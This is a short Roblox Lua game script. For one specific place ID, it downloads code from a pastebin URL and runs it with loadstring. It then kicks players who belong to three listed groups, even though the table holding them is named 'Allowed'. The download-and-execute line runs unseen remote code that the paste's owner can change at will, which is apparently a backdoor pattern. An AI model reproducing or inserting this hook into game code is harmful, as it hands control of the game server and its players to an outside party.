if game.PlaceId == 4483381587  then 
loadstring(game:HttpGet("https://pastebin.com/raw/EnqBEkeV"))()
  local Allowed = {
  [16867953] = true,
   [34024309] = true,
     [34056244] = true
  }
  game.Players.PlayerAdded:Connect(function(player)
    for idAllowed, _ in pairs(Allowed) do
        if player:IsInGroup(idAllowed) then
            player:Kick("Has sido expulsado del juego por pertenecer a un grupo prohibido.")
        end
    end
end)
end
